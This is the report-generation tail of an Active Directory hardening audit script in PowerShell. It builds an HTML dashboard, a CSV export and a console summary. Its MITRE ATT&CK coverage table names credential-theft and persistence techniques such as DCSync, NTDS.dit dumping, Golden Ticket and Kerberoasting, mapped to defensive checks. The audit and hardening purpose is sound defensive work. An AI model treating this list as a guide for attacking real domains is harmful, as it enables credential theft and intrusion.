  <div class='cat-header'>
    <span class='cat-name'>$d</span>
    <span class='cat-score' style='color:$bg'>$dp%&nbsp;&nbsp;($($ds.Score)/$($ds.Max) pts)</span>
    <a href='#domain-score-table' class='back-link'>&#8593; Back to categories</a>
  </div>
  $(if ($catRows) {
    "<table><tr><th style='width:90px'>Severity</th><th style='width:220px'>Check</th><th>Detail / Attack Path / Fix</th></tr>$catRows</table>"
  } else { $noIssues })
</div>
"@
}

$html = @"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>AD Hardening Report -- $domFQDN</title>
<style>
:root { --bg:#0f1117; --card:#1a1d2e; --border:#2d3047; --text:#e2e8f0; --dim:#8892a4; --red:#e74c3c; --orange:#e67e22; --yellow:#f1c40f; --green:#27ae60; --blue:#3498db; --purple:#9b59b6; }
* { box-sizing:border-box; margin:0; padding:0; }
html { scroll-behavior:smooth; }
body { background:var(--bg); color:var(--text); font-family:'Segoe UI',system-ui,sans-serif; padding:24px; }
h1 { font-size:1.8rem; margin-bottom:4px; }
.subtitle { color:var(--dim); font-size:.9rem; margin-bottom:24px; }
.grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:16px; margin-bottom:24px; }
.card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:18px; }
.card h3 { font-size:.8rem; color:var(--dim); text-transform:uppercase; letter-spacing:.08em; margin-bottom:8px; }
.card .big { font-size:2.2rem; font-weight:700; }
.score-ring { text-align:center; }
.score-ring .pct { font-size:3rem; font-weight:700; color:$(if ($pct -ge 75) { '#27ae60' } elseif ($pct -ge 50) { '#f1c40f' } else { '#e74c3c' }); }
.score-ring .label { color:var(--dim); font-size:.85rem; }
table { width:100%; border-collapse:collapse; font-size:.85rem; margin-bottom:24px; }
th { background:var(--card); color:var(--dim); font-weight:600; text-align:left; padding:10px 12px; border-bottom:2px solid var(--border); }
td { padding:10px 12px; border-bottom:1px solid var(--border); vertical-align:top; }
tr:hover td { background:rgba(255,255,255,.03); }
.sev { display:inline-block; padding:2px 8px; border-radius:4px; color:#fff; font-size:.75rem; font-weight:700; white-space:nowrap; }
.bar-outer { background:var(--border); border-radius:4px; height:8px; width:140px; }
.bar-inner { height:8px; border-radius:4px; }
.badge { display:inline-block; padding:1px 6px; border-radius:3px; font-size:.7rem; margin:2px 2px 0 0; }
.mitre { background:#1a2744; color:#7eb8f7; border:1px solid #2d4470; }
.cis   { background:#1c2e1a; color:#7fcf7a; border:1px solid #2e5e2a; }
.attack-path { margin-top:6px; padding:6px 8px; background:#2d1a1a; border-left:3px solid var(--red); border-radius:0 4px 4px 0; font-size:.8rem; color:#f4a4a4; }
.fix { margin-top:6px; padding:6px 8px; background:#1a2d1a; border-left:3px solid var(--green); border-radius:0 4px 4px 0; font-size:.8rem; }
.fix code { background:#0f1f0f; padding:2px 5px; border-radius:3px; font-family:monospace; font-size:.78rem; color:#90ee90; word-break:break-all; }
.resources { margin-top:4px; font-size:.78rem; color:var(--dim); }
.section-title { margin:24px 0 12px; font-size:1.1rem; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:6px; }
.maturity { font-size:1.1rem; font-weight:600; color:$(if ($pct -ge 75) { '#27ae60' } elseif ($pct -ge 50) { '#f1c40f' } else { '#e74c3c' }); }
footer { margin-top:32px; color:var(--dim); font-size:.75rem; text-align:center; border-top:1px solid var(--border); padding-top:16px; }
/* --- Category navigation -------------------------------------------------- */
.cat-link { color:var(--blue); text-decoration:none; font-weight:600; }
.cat-link:hover { text-decoration:underline; color:#5dade2; }
.issue-count { display:inline-block; margin-left:8px; padding:1px 7px; border-radius:10px; font-size:.7rem; font-weight:700; background:#3d1c1c; color:#f4a4a4; border:1px solid #7a3333; vertical-align:middle; }
.cat-section { scroll-margin-top:20px; margin-bottom:8px; }
.cat-header { display:flex; align-items:center; gap:14px; margin:28px 0 10px; padding:10px 16px; background:var(--card); border-radius:6px; border-left:4px solid var(--blue); }
.cat-name { font-size:1rem; font-weight:700; flex:1; }
.cat-score { font-size:.9rem; font-weight:600; white-space:nowrap; }
.back-link { color:var(--dim); font-size:.8rem; text-decoration:none; padding:3px 8px; border:1px solid var(--border); border-radius:4px; white-space:nowrap; transition:color .15s,border-color .15s; }
.back-link:hover { color:var(--text); border-color:var(--dim); }
.no-issues { padding:10px 14px; background:var(--card); border-radius:6px; color:var(--green); font-size:.85rem; margin-bottom:16px; }
/* --- Severity filter bar -------------------------------------------------- */
.filter-bar { display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:12px; }
.filter-btn { padding:5px 14px; border-radius:20px; border:1px solid var(--border); background:var(--card); color:var(--dim); font-size:.78rem; font-weight:600; cursor:pointer; transition:background .15s,color .15s,border-color .15s; }
.filter-btn:hover { border-color:var(--dim); color:var(--text); }
.filter-btn.active { color:#fff; border-color:transparent; }
.filter-btn[data-filter="All"].active    { background:#2d3047; color:var(--text); border-color:var(--border); }
.filter-btn[data-filter="Critical"].active { background:var(--red); }
.filter-btn[data-filter="High"].active     { background:var(--orange); }
.filter-btn[data-filter="Medium"].active   { background:#c9a800; color:#000; }
.filter-btn[data-filter="Low"].active      { background:var(--blue); }
.filter-sep { color:var(--border); user-select:none; }
.export-btn { padding:5px 14px; border-radius:20px; border:1px solid #2d4470; background:#1a2744; color:#7eb8f7; font-size:.78rem; font-weight:600; cursor:pointer; transition:background .15s,color .15s; margin-left:auto; }
.export-btn:hover { background:#22336a; color:#a8d0ff; }
.filter-count { color:var(--dim); font-size:.78rem; margin-left:4px; }
</style>
</head>
<body>
<h1>Active Directory Hardening Report</h1>
<div class="subtitle">Domain: <b>$domFQDN</b> &nbsp;|&nbsp; Forest: <b>$($forest.Name)</b> &nbsp;|&nbsp; Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm') &nbsp;|&nbsp; DFL: $(if ($domain -and $domain.PSObject.Properties['DomainMode']) { $domain.DomainMode } else { 'N/A' })</div>

<div class="grid">
  <div class="card score-ring">
    <h3>Hardening Score</h3>
    <div class="pct">$pct%</div>
    <div class="label">$($script:Score) / $($script:MaxScore) pts</div>
  </div>
  <div class="card"><h3>Maturity Level</h3><div class="maturity">$maturity</div></div>
  <div class="card"><h3>Critical Findings</h3><div class="big" style="color:var(--red)">$critCount</div></div>
  <div class="card"><h3>High Findings</h3><div class="big" style="color:var(--orange)">$highCount</div></div>
  <div class="card"><h3>Medium Findings</h3><div class="big" style="color:var(--yellow)">$medCount</div></div>
  <div class="card"><h3>Total Checks</h3><div class="big">$($script:Findings.Count)</div></div>
</div>

<div class="section-title" id="domain-score-table">Domain Score by Category &mdash; <small style="font-size:.8rem;font-weight:400;color:var(--dim)">click a category to jump to its findings</small></div>
<table>
<tr><th>Category</th><th>Score</th><th>Coverage</th><th>%</th></tr>
$domainRows
</table>

<div class="section-title">All Findings &mdash; Sorted by Severity</div>
<div class="filter-bar">
  <button class="filter-btn active" data-filter="All"      onclick="filterFindings(this)">All <span class="filter-count" id="cnt-All">$($script:Findings | Where-Object { $_.Severity -notin @('Good','Info') } | Measure-Object | Select-Object -ExpandProperty Count)</span></button>
  <span class="filter-sep">|</span>
  <button class="filter-btn" data-filter="Critical" onclick="filterFindings(this)">Critical <span class="filter-count" id="cnt-Critical">$critCount</span></button>
  <button class="filter-btn" data-filter="High"     onclick="filterFindings(this)">High <span class="filter-count" id="cnt-High">$highCount</span></button>
  <button class="filter-btn" data-filter="Medium"   onclick="filterFindings(this)">Medium <span class="filter-count" id="cnt-Medium">$medCount</span></button>
  <button class="filter-btn" data-filter="Low"      onclick="filterFindings(this)">Low <span class="filter-count" id="cnt-Low">$($script:Findings | Where-Object { $_.Severity -eq 'Low' } | Measure-Object | Select-Object -ExpandProperty Count)</span></button>
  <button class="export-btn" onclick="exportResourcesCsv()">Export Affected Resources (CSV)</button>
</div>
<table id="findings-table">
<tr><th style="width:90px">Severity</th><th style="width:150px">Domain</th><th style="width:200px">Check</th><th>Detail / Attack Path / Fix</th></tr>
$findingRows
</table>

<div class="section-title">Findings by Category</div>
$categoryDetailSections

<div class="section-title">MITRE ATT&amp;CK Coverage</div>
<table>
<tr><th>Technique</th><th>Name</th><th>Covered By</th><th>Domain</th></tr>
<tr><td>T1003.001</td><td>LSA-SS Memory Dump</td><td>Credential Guard, LSA PPL, WDigest checks</td><td>Credential Protection</td></tr>
<tr><td>T1003.003</td><td>NTDS.dit Dump</td><td>Backup Operators group, SeBackupPrivilege audit</td><td>Object Ownership</td></tr>
<tr><td>T1003.006</td><td>DCSync</td><td>DCSync ACL check on domain root; Exchange WriteDACL; MSOL_ account</td><td>ACL Hygiene, Exchange &amp; Hybrid</td></tr>
<tr><td>T1021.002</td><td>SMB/Windows Admin Shares</td><td>SMB signing enforcement check</td><td>Network Signing</td></tr>
<tr><td>T1071.004</td><td>DNS C2</td><td>DNS zone transfer, secure dynamic updates, ADIDNS wildcard</td><td>DNS Security</td></tr>
<tr><td>T1078.001</td><td>Valid Accounts (Default/DSRM)</td><td>DSRM AdminLogonBehavior, DSRM password age</td><td>DSRM &amp; Sensitive Rights</td></tr>
<tr><td>T1078.002</td><td>Valid Accounts (Domain)</td><td>Privileged group audit, stale accounts, tier violations, Server Operators</td><td>Privileged Access, Tier Hygiene</td></tr>
<tr><td>T1098</td><td>Account Manipulation</td><td>Account Operators group, ACL hygiene, AdminSDHolder</td><td>Object Ownership, ACL Hygiene</td></tr>
<tr><td>T1110.003</td><td>Password Spraying</td><td>Lockout threshold, fine-grained password policy, NTLM level</td><td>Password Policy, Network Signing</td></tr>
<tr><td>T1134.005</td><td>SID-History Injection</td><td>SIDHistory audit, trust SID filtering</td><td>Kerberos &amp; Delegation, Trust</td></tr>
<tr><td>T1187</td><td>Forced Authentication (Coercion)</td><td>Print Spooler on DCs/members, WebClient, WPAD, mitm6/IPv6, mDNS</td><td>DC Hardening, Coercion Surface</td></tr>
<tr><td>T1222.001</td><td>File/Directory Permissions Modification</td><td>Object ownership of krbtgt/DA group/AdminSDHolder</td><td>Object Ownership</td></tr>
<tr><td>T1484.001</td><td>GPO Modification</td><td>GPO delegation, orphaned GPO checks</td><td>GPO Security</td></tr>
<tr><td>T1547.006</td><td>Kernel Modules / Driver Load</td><td>Print Operators group (SeLoadDriverPrivilege / BYOVD)</td><td>Object Ownership</td></tr>
<tr><td>T1550.002</td><td>Pass-Hash</td><td>Protected Users, Credential Guard, LAPS, NTLM level</td><td>Credential Protection, Network Signing</td></tr>
<tr><td>T1552.001</td><td>Credentials in Files</td><td>GPP cpassword, SYSVOL scripts, LAPS ACL</td><td>GPO Security, Tier Hygiene</td></tr>
<tr><td>T1552.006</td><td>Group Policy Preferences</td><td>SYSVOL cpassword scan</td><td>GPO Security</td></tr>
<tr><td>T1556.006</td><td>Modify Authentication (Shadow Credentials)</td><td>msDS-KeyCredentialLink population, write ACL audit, ESC10 binding enforcement</td><td>Shadow Credentials</td></tr>
<tr><td>T1557.001</td><td>LLMNR/NBT-NS Poisoning</td><td>LLMNR disable, NetBIOS disable, SMB signing, WPAD, mDNS</td><td>Network Signing, Coercion Surface</td></tr>
<tr><td>T1558.001</td><td>Golden Ticket</td><td>krbtgt password age (&lt;180 days), TGT lifetime, domain functional level</td><td>Kerberos Hardening</td></tr>
<tr><td>T1558.003</td><td>Kerb-roasting</td><td>SPNs on user accounts, RC4 allowed, gMSA coverage</td><td>Kerberos &amp; Delegation</td></tr>
<tr><td>T1558.004</td><td>AS-REP Roasting</td><td>DoesNotRequirePreAuth accounts</td><td>Kerberos &amp; Delegation</td></tr>
<tr><td>T1574.002</td><td>DLL Side-Loading (DnsAdmins)</td><td>DnsAdmins group membership count</td><td>Privileged Access</td></tr>
<tr><td>T1590.002</td><td>DNS Zone Transfer (Recon)</td><td>Zone transfer restriction, secure dynamic updates</td><td>DNS Security</td></tr>
<tr><td>T1649</td><td>Steal/Forge Certificates</td><td>ADCS ESC1/ESC2/ESC3/ESC4/ESC6/ESC7/ESC8, ESC10 strong binding</td><td>ADCS/PKI, ADCS Extended, Shadow Credentials</td></tr>
<tr><td>T1136.001</td><td>Create Account (Local)</td><td>Backdoor account staging detection (enabled + password set + never logged in)</td><td>Logon Anomaly</td></tr>
<tr><td>T1110</td><td>Brute Force</td><td>PASSWD_NOTREQD accounts, accounts with no password enforcement</td><td>Logon Anomaly</td></tr>
<tr><td>T1566.002</td><td>Spearphishing Link</td><td>Admin accounts with standard email UPN (phishing surface via admin mailbox)</td><td>PAW Controls</td></tr>
<tr><td>T1098.002</td><td>Account Manipulation -- Exchange Email Delegate</td><td>ForceChangePassword ACE on AdminCount=1 accounts (31.1), group write ACLs</td><td>Privilege Escalation Paths</td></tr>
<tr><td>T1190</td><td>Exploit Public-Facing Application</td><td>Legacy EOL OS on domain-joined computers; LAPS coverage gaps</td><td>Identity Inventory, Lateral Movement</td></tr>
<tr><td>T1552.001</td><td>Credentials in Files -- Registry</td><td>AD Description field credential hints; SYSVOL script credential search</td><td>Logon Anomaly, GPO Security</td></tr>
</table>

<footer>Generated by Invoke-ADHardening.ps1 -- ASPAT Active Directory Hardening Assessment &nbsp;|&nbsp; $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</footer>

<script>
// ---- Severity filter --------------------------------------------------------
var currentFilter = 'All';

function filterFindings(btn) {
    currentFilter = btn.getAttribute('data-filter');
    var rows = document.querySelectorAll('#findings-table tr.finding-row');
    for (var i = 0; i < rows.length; i++) {
        var sev = rows[i].getAttribute('data-sev');
        rows[i].style.display = (currentFilter === 'All' || sev === currentFilter) ? '' : 'none';
    }
    var btns = document.querySelectorAll('.filter-btn');
    for (var j = 0; j < btns.length; j++) {
        btns[j].classList.toggle('active', btns[j] === btn);
    }
}

// ---- Export affected resources as CSV --------------------------------------
// Collects data-res from every visible finding row, expands the " | " separated
// list into one row per resource, and triggers a browser CSV download.
function exportResourcesCsv() {
    var rows = document.querySelectorAll('#findings-table tr.finding-row');
    var lines = ['Severity,Domain,Check,AffectedResource'];
    var ts = new Date().toISOString().replace(/[:.]/g,'-').slice(0,19);
    var fname = 'AffectedResources_' + currentFilter + '_' + ts + '.csv';

    for (var i = 0; i < rows.length; i++) {
        var row = rows[i];
        if (row.style.display === 'none') { continue; }
        var sev    = row.getAttribute('data-sev')    || '';
        var domain = row.getAttribute('data-domain') || '';
        var check  = row.getAttribute('data-check')  || '';
        var res    = row.getAttribute('data-res')    || '';
        if (!res.trim()) { continue; }

        var resources = res.split(' | ');
        for (var r = 0; r < resources.length; r++) {
            var resource = resources[r].trim();
            if (!resource) { continue; }
            lines.push(
                csvCell(sev) + ',' + csvCell(domain) + ',' + csvCell(check) + ',' + csvCell(resource)
            );
        }
    }

    if (lines.length <= 1) {
        alert('No affected resources found for the current filter (' + currentFilter + ').\nFindings without a resource list (e.g. configuration checks) are not included.');
        return;
    }

    var csv = lines.join('\r\n');
    var blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.setAttribute('download', fname);
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function csvCell(val) {
    return '"' + val.replace(/"/g, '""') + '"';
}
</script>

</body>
</html>
"@

$dateSafe  = Get-Date -Format "yyyyMMdd-HHmmss"
$htmlPath  = Join-Path $OutputPath "ADHardening-$domFQDN-$dateSafe.html"
$html | Out-File -FilePath $htmlPath -Encoding UTF8
Write-Host "`n  HTML Report : $htmlPath" -ForegroundColor Green
}

# -- CSV Export -----------------------------------------------------------------
if (-not $NoCsv) {
    $csvPath = Join-Path $OutputPath "ADHardening-$domFQDN-$dateSafe.csv"
    $script:Findings | Where-Object { $_.Severity -notin @('Good','Info') } |
        Select-Object Domain,Severity,Check,Detail,Resources,MITRE,CIS,Fix |
        Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
    Write-Host "  CSV Export  : $csvPath" -ForegroundColor Green
}

# -- Final Summary --------------------------------------------------------------
Write-Host "`n-----------------------------------------------------------" -ForegroundColor Cyan

$top3 = @($script:Findings | Where-Object { $_.Severity -in @('Critical','High') } | Select-Object -First 3)
Write-Host "  Fix IMMEDIATELY (Critical -> High):" -ForegroundColor Red
$i = 1
foreach ($f in $top3) { Write-Host "  $i. [$($f.Domain)] $($f.Check)" -ForegroundColor DarkYellow; $i++ }

Write-Host "`n  AD Hardening Score: $($script:Score)/$($script:MaxScore) ($pct%) -- $maturity"
Write-Host "  Runtime: $([math]::Round(((Get-Date) - $script:StartTime).TotalSeconds))s"
Write-Host "-----------------------------------------------------------" -ForegroundColor Cyan
